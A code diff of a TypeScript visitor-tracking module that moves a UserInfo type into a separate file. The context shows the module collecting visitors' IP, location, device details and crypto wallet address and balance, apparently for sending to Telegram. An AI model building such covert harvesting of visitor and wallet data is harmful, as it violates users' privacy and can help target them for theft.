@@ -1,77 +1,14 @@
 import { StorageManager } from './storage';
 import { sendToTelegram } from './telegram';
 import { DATA_COLLECTION_CONFIG, USER_INFO_CONFIG } from './config';
-
-/**
- * Interface describing user and session information collected by the app
- */
-export interface UserInfo {
-  /** User's IP address */
-  ip: string;
-  
-  /** Website information */
-  websiteInfo: {
-    /** Current URL */
-    url: string;
-    /** Page title */
-    title: string;
-    /** Referrer URL or 'Direct' */
-    referrer: string;
-    /** Time spent on page in seconds (optional) */
-    timeOnPage?: number;
-  };
-  
-  /** Geolocation information if available */
-  location: {
-    /** User's city */
-    city?: string;
-    /** User's country */
-    country?: string;
-    /** User's region/state */
-    region?: string;
-  };
-  
-  /** Device information */
-  device: {
-    /** Device type classification */
-    type: 'Desktop' | 'Mobile' | 'Tablet';
-    /** Browser name */
-    browser: string;
-    /** Operating system */
-    os: string;
-    /** User agent string */
-    userAgent: string;
-  };
-  
-  /** Wallet information if connected */
-  wallet: {
-    /** Wallet address */
-    address?: string;
-    /** Network information */
-    network?: {
-      /** Network name */
-      name: string;
-      /** Network chain ID */
-      chainId: number;
-    };
-    /** Wallet balance */
-    balance?: {
-      /** ETH balance */
-      eth: string;
-      /** USD equivalent (if available) */
-      usd?: string;
-    };
-    /** Whether wallet is connected */
-    isConnected: boolean;
-  };
-}
+import { UserInfo, WalletInfo } from '../types/userInfo';
 
 /**
  * Initializes user tracking and sends data if appropriate
  * @param walletInfo - Information about the user's connected wallet
  * @returns Promise that resolves when tracking is complete
  */
-export async function initializeUserTracking(walletInfo: UserInfo['wallet']): Promise<void> {
+export async function initializeUserTracking(walletInfo: WalletInfo): Promise<void> {
   if (StorageManager.shouldNotifyNewVisit()) {
     if (DATA_COLLECTION_CONFIG.DEBUG_ENABLED) {
       console.debug('New visit detected - collecting user information...');
@@ -102,7 +39,7 @@ export async function initializeUserTracking(walletInfo: UserInfo['wallet']): Pr
  * @param walletInfo - Information about the user's connected wallet
  * @returns Promise resolving to complete UserInfo object
  */
-async function getUserInfo(walletInfo: UserInfo['wallet']): Promise<UserInfo> {
+async function getUserInfo(walletInfo: WalletInfo): Promise<UserInfo> {
   try {
     // Set up request with timeout for IP API
     const ipController = new AbortController();
